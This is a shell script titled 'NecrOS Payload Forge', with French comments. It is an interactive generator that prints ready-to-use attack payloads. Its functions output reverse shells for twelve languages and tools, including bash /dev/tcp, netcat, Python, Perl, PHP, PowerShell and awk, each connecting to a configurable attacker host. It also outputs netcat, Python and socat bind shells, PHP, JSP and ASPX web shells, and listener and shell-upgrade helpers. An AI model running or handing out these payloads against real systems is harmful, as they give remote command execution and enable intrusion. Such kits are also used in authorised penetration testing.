#!/bin/sh
# ============================================================================
#  NecrOS PAYLOAD FORGE - "Craft Your Weapons"
#  Générateur de Reverse/Bind Shells & Payloads
# ============================================================================

CYAN='\033[0;36m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

VERSION="1.0"

# Détection IP locale
LHOST=$(ip addr show 2>/dev/null | grep "inet " | grep -v 127.0.0.1 | head -1 | awk '{print $2}' | cut -d/ -f1)
LPORT="4444"

banner() {
    echo ""
    echo "${RED}    ⚔️  PAYLOAD FORGE ⚔️${NC}"
    echo "${CYAN}    \"Forge your weapons\"${NC}"
    echo ""
    echo "${GREEN}    LHOST: ${LHOST:-NOT_SET}${NC}"
    echo "${GREEN}    LPORT: ${LPORT}${NC}"
    echo ""
}

menu_reverse() {
    echo "${CYAN}═══ REVERSE SHELLS ═══${NC}"
    echo "[1] Bash TCP"
    echo "[2] Bash UDP"
    echo "[3] Netcat -e"
    echo "[4] Netcat FIFO (sans -e)"
    echo "[5] Python3"
    echo "[6] Python2"
    echo "[7] Perl"
    echo "[8] PHP"
    echo "[9] Ruby"
    echo "[10] Socat"
    echo "[11] Powershell"
    echo "[12] Awk"
    echo "[0] Retour"
}

menu_bind() {
    echo "${CYAN}═══ BIND SHELLS ═══${NC}"
    echo "[1] Netcat"
    echo "[2] Python3"
    echo "[3] Socat"
    echo "[0] Retour"
}

menu_webshells() {
    echo "${CYAN}═══ WEB SHELLS ═══${NC}"
    echo "[1] PHP Simple"
    echo "[2] PHP Upload"
    echo "[3] JSP"
    echo "[4] ASPX"
    echo "[0] Retour"
}

menu_utils() {
    echo "${CYAN}═══ UTILITAIRES ═══${NC}"
    echo "[1] Listener Netcat"
    echo "[2] Listener Socat (PTY)"
    echo "[3] Upgrade Shell (Python PTY)"
    echo "[4] Encoder Base64"
    echo "[5] Encoder URL"
    echo "[6] Serveur HTTP Python"
    echo "[0] Retour"
}

gen_reverse() {
    case $1 in
        1) echo "bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1" ;;
        2) echo "bash -i >& /dev/udp/${LHOST}/${LPORT} 0>&1" ;;
        3) echo "nc -e /bin/sh ${LHOST} ${LPORT}" ;;
        4) echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${LHOST} ${LPORT} >/tmp/f" ;;
        5) echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${LHOST}\",${LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'" ;;
        6) echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${LHOST}\",${LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'" ;;
        7) echo "perl -e 'use Socket;\$i=\"${LHOST}\";\$p=${LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" ;;
        8) echo "php -r '\$sock=fsockopen(\"${LHOST}\",${LPORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'" ;;
        9) echo "ruby -rsocket -e'f=TCPSocket.open(\"${LHOST}\",${LPORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" ;;
        10) echo "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${LHOST}:${LPORT}" ;;
        11) echo "powershell -nop -c \"\$c=New-Object Net.Sockets.TCPClient('${LHOST}',${LPORT});\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){;\$d=(New-Object Text.ASCIIEncoding).GetString(\$b,0,\$i);\$sb=(iex \$d 2>&1|Out-String);\$sb2=\$sb+'PS '+(pwd).Path+'> ';\$sb=([text.encoding]::ASCII).GetBytes(\$sb2);\$s.Write(\$sb,0,\$sb.Length);\$s.Flush()};\$c.Close()\"" ;;
        12) echo "awk 'BEGIN {s = \"/inet/tcp/0/${LHOST}/${LPORT}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print \$0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null" ;;
    esac
}

gen_bind() {
    case $1 in
        1) echo "nc -lvnp ${LPORT} -e /bin/sh" ;;
        2) echo "python3 -c 'import socket,os;s=socket.socket();s.bind((\"\",${LPORT}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);os.system(\"/bin/sh\")'" ;;
        3) echo "socat TCP-LISTEN:${LPORT},reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane" ;;
    esac
}

gen_webshell() {
    case $1 in
        1) echo "<?php system(\$_GET['cmd']); ?>" ;;
        2) cat << 'EOF'
<?php
if(isset($_FILES['f'])){move_uploaded_file($_FILES['f']['tmp_name'],$_FILES['f']['name']);}
if(isset($_GET['cmd'])){echo '<pre>'.shell_exec($_GET['cmd']).'</pre>';}
?>
<form method="POST" enctype="multipart/form-data"><input type="file" name="f"><input type="submit" value="Upload"></form>
EOF
            ;;
        3) echo "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>" ;;
        4) echo "<%@ Page Language=\"C#\" %><%System.Diagnostics.Process.Start(\"cmd.exe\",\"/c \"+Request[\"cmd\"]);%>" ;;
    esac
}

gen_utils() {
    case $1 in
        1) echo "nc -lvnp ${LPORT}" ;;
        2) echo "socat file:\$(tty),raw,echo=0 tcp-listen:${LPORT}" ;;
        3) echo "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'" ;;
        4) 
            echo -n "Texte à encoder: "
            read txt
            echo "$txt" | base64
            ;;
        5)
            echo -n "Texte à encoder: "
            read txt
            python3 -c "import urllib.parse; print(urllib.parse.quote('''$txt'''))" 2>/dev/null || echo "$txt" | sed 's/ /%20/g; s/&/%26/g; s/?/%3F/g'
            ;;
        6) echo "python3 -m http.server ${LPORT}" ;;
    esac
}

config_menu() {
    echo ""
    echo "${CYAN}═══ CONFIGURATION ═══${NC}"
    echo "LHOST actuel: ${LHOST:-NON DÉFINI}"
    echo "LPORT actuel: ${LPORT}"
    echo ""
    echo -n "Nouvelle IP (Enter pour garder): "
    read new_ip
    [ -n "$new_ip" ] && LHOST="$new_ip"
    
    echo -n "Nouveau PORT (Enter pour garder): "
    read new_port
    [ -n "$new_port" ] && LPORT="$new_port"
    
    echo "${GREEN}[✓] Configuration mise à jour${NC}"
}

output_payload() {
    payload="$1"
    echo ""
    echo "${YELLOW}════════════════════════════════════════════════════════════${NC}"
    echo "${GREEN}$payload${NC}"
    echo "${YELLOW}════════════════════════════════════════════════════════════${NC}"
    echo ""
    
    # Copier dans clipboard si xclip disponible
    if command -v xclip >/dev/null 2>&1; then
        echo "$payload" | xclip -selection clipboard 2>/dev/null && echo "${CYAN}[+] Copié dans le clipboard${NC}"
    fi
}

main_menu() {
    while true; do
        clear
        banner
        echo "${CYAN}═══ MENU PRINCIPAL ═══${NC}"
        echo "[1] 🔙 Reverse Shells"
        echo "[2] 🔗 Bind Shells"
        echo "[3] 🌐 Web Shells"
        echo "[4] 🛠️  Utilitaires"
        echo "[5] ⚙️  Configuration"
        echo "[0] Quitter"
        echo ""
        echo -n "> "
        read choice
        
        case $choice in
            1)
                while true; do
                    clear; banner; menu_reverse
                    echo ""; echo -n "> "; read rc
                    [ "$rc" = "0" ] && break
                    [ -n "$rc" ] && [ "$rc" -ge 1 ] 2>/dev/null && [ "$rc" -le 12 ] && output_payload "$(gen_reverse $rc)"
                    echo ""; read -p "Appuyez sur Entrée..."
                done
                ;;
            2)
                while true; do
                    clear; banner; menu_bind
                    echo ""; echo -n "> "; read bc
                    [ "$bc" = "0" ] && break
                    [ -n "$bc" ] && [ "$bc" -ge 1 ] 2>/dev/null && [ "$bc" -le 3 ] && output_payload "$(gen_bind $bc)"
                    echo ""; read -p "Appuyez sur Entrée..."
                done
                ;;
            3)
                while true; do
                    clear; banner; menu_webshells
                    echo ""; echo -n "> "; read wc
                    [ "$wc" = "0" ] && break
                    [ -n "$wc" ] && [ "$wc" -ge 1 ] 2>/dev/null && [ "$wc" -le 4 ] && output_payload "$(gen_webshell $wc)"
                    echo ""; read -p "Appuyez sur Entrée..."
                done
                ;;
            4)
                while true; do
                    clear; banner; menu_utils
                    echo ""; echo -n "> "; read uc
                    [ "$uc" = "0" ] && break
                    [ -n "$uc" ] && [ "$uc" -ge 1 ] 2>/dev/null && [ "$uc" -le 6 ] && output_payload "$(gen_utils $uc)"
                    echo ""; read -p "Appuyez sur Entrée..."
                done
                ;;
            5)
                config_menu
                read -p "Appuyez sur Entrée..."
                ;;
            0)
                echo "${CYAN}💀 À bientôt, Necromancien.${NC}"
                exit 0
                ;;
        esac
    done
}

# Quick mode (argument direct)
if [ -n "$1" ]; then
    case "$1" in
        --help|-h)
            echo "Usage: necros-payload [type] [num]"
            echo "Types: reverse, bind, web, listen"
            echo "Ex: necros-payload reverse 1"
            exit 0
            ;;
        reverse) [ -n "$2" ] && gen_reverse "$2" && exit 0 ;;
        bind) [ -n "$2" ] && gen_bind "$2" && exit 0 ;;
        web) [ -n "$2" ] && gen_webshell "$2" && exit 0 ;;
        listen) echo "nc -lvnp ${LPORT}"; exit 0 ;;
    esac
fi

main_menu
